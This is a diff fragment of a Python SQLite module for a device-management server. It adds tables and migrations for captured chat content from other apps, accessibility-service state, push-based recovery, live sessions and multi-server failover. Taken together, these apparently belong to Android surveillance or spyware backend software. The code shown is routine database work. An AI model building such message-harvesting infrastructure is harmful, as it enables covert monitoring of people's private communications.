+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(devices)"
+        ).fetchall()
+    }
+
+    if "fcm_recovery_mode" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN fcm_recovery_mode TEXT DEFAULT 'auto'"
+        )
+
+    conn.commit()
+
+def _migrate_communication_activity(conn):
+    """Ensure communication activity storage exists on existing CMS databases."""
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS communication_activity (
+            id           INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id    TEXT NOT NULL,
+            package_name TEXT NOT NULL,
+            app_name     TEXT NOT NULL,
+            chat_name    TEXT NOT NULL DEFAULT 'Unknown',
+            direction    TEXT NOT NULL CHECK(direction IN ('sent','received','visited')),
+            content      TEXT NOT NULL,
+            event_time   INTEGER NOT NULL,
+            synced_at    TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+        )
+    """)
+    conn.execute("CREATE INDEX IF NOT EXISTS idx_comm_device ON communication_activity(device_id)")
+    conn.execute("CREATE INDEX IF NOT EXISTS idx_comm_app ON communication_activity(package_name)")
+    conn.execute("CREATE INDEX IF NOT EXISTS idx_comm_chat ON communication_activity(chat_name)")
+    conn.execute("CREATE INDEX IF NOT EXISTS idx_comm_time ON communication_activity(event_time)")
+    conn.execute("""
+        CREATE UNIQUE INDEX IF NOT EXISTS idx_comm_dedup
+        ON communication_activity(device_id, package_name, chat_name, direction, content, event_time)
+    """)
+    conn.commit()
+
+
+def _migrate_server_failover(conn):
+    device_columns = {
+        row[1] for row in conn.execute("PRAGMA table_info(devices)").fetchall()
+    }
+    if "server_slot" not in device_columns:
+        conn.execute("ALTER TABLE devices ADD COLUMN server_slot INTEGER DEFAULT 1")
+    if "server_routing_mode" not in device_columns:
+        conn.execute("ALTER TABLE devices ADD COLUMN server_routing_mode TEXT DEFAULT 'auto'")
+
+    settings_columns = {
+        row[1] for row in conn.execute("PRAGMA table_info(settings)").fetchall()
+    }
+    for column in ("server1_url", "server2_url", "server3_url", "server4_url", "server5_url", "server6_url"):
+        if column not in settings_columns:
+            conn.execute(f"ALTER TABLE settings ADD COLUMN {column} TEXT")
+    conn.commit()
+
+
+
+def _migrate_device_management_state(conn):
+    """Add per-device pause/decommission state safely to existing databases."""
+    columns = {row[1] for row in conn.execute("PRAGMA table_info(devices)").fetchall()}
+    additions = {
+        "management_state": "TEXT DEFAULT 'active'",
+        "paused_at": "TEXT",
+        "decommissioned_at": "TEXT",
+        "management_state_updated_at": "TEXT",
+    }
+    for name, sql_type in additions.items():
+        if name not in columns:
+            conn.execute(f"ALTER TABLE devices ADD COLUMN {name} {sql_type}")
+    conn.execute("UPDATE devices SET management_state='active' WHERE management_state IS NULL OR management_state=''")
+    conn.commit()
+
+def init_db():
+    """Initialize schema and seed defaults. Safe to call on every startup."""
+    from config import ensure_directories
+    ensure_directories()
+
+    conn = sqlite3.connect(
+        Config.DATABASE_PATH,
+        check_same_thread=False
+    )
+
+    conn.row_factory = sqlite3.Row
+
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA foreign_keys=ON")
+
+    # First create all tables for a completely new database.
+    conn.executescript(SCHEMA_SQL)
+
+    # Then migrate existing tables from older database versions.
+    # SQLite CREATE TABLE IF NOT EXISTS does not add new columns
+    # to tables that already existed.
+    _migrate_device_ui_state(conn)
+    _migrate_device_management_state(conn)
+
+    _migrate_message_types(conn)
+
+    _migrate_permission_notification_settings(conn)
+
+    _migrate_fcm_tokens(conn)
+
+    _migrate_fcm_command_setting(conn)
+
+    _migrate_fcm_recovery_state(conn)
+
+    _migrate_fcm_recovery_mode(conn)
+
+    _migrate_runtime_state(conn)
+    _migrate_accessibility_binding_state(conn)
+    _migrate_server_failover(conn)
+
+    # Repair/upgrade an incompatible live_sessions table created by
+    # an earlier Live implementation.
+    _migrate_live_sessions(conn)
+
+    # Seed admin user
+    if conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
+        from werkzeug.security import generate_password_hash
+        conn.execute(
+            "INSERT INTO users (username, password_hash) VALUES (?,?)",
+            (Config.DEFAULT_ADMIN_USERNAME,
+             generate_password_hash(Config.DEFAULT_ADMIN_PASSWORD))
+        )
+        conn.commit()
+
+    # Seed settings row
+    if conn.execute("SELECT COUNT(*) FROM settings").fetchone()[0] == 0:
+        conn.execute(
+            """INSERT INTO settings
+               (id, heartbeat_interval, retry_interval, storage_limit_mb,
+                temp_file_lifetime_hours, log_retention_days, heartbeat_timeout)
+               VALUES (1,?,?,?,?,?,?)""",
+            (Config.HEARTBEAT_INTERVAL_SECONDS, Config.RETRY_INTERVAL_SECONDS,
+             Config.STORAGE_LIMIT_MB, Config.TEMP_FILE_LIFETIME_HOURS,
+             Config.LOG_RETENTION_DAYS, Config.HEARTBEAT_TIMEOUT_SECONDS)
+        )
+        conn.commit()
+
+    conn.close()
+
+
+def get_settings():
+    """Return the settings row as a plain dict (never sqlite3.Row)."""
+    return query_db("SELECT * FROM settings WHERE id=1", one=True) or {}
+
+
+def log_activity(device_id, category, action, result="success", details=None, ip=None):
+    """Log to activity_logs. Silently ignores errors to never break request flow."""
+    try:
+        execute_db(
+            """INSERT INTO activity_logs
+               (device_id, category, action, result, details, ip_address)
+               VALUES (?,?,?,?,?,?)""",
+            (device_id, category, action, result, details, ip)
+        )
+    except Exception:
+        pass
+
+
+def log_error(device_id, module, error_type, message, stacktrace=None):
+    """Log to error_logs. Silently ignores errors to never break request flow."""
+    try:
+        execute_db(
+            """INSERT INTO error_logs
+               (device_id, module, error_type, message, stacktrace)
+               VALUES (?,?,?,?,?)""",
+            (device_id, module, error_type, message, stacktrace)
+        )
+    except Exception:
+        pass
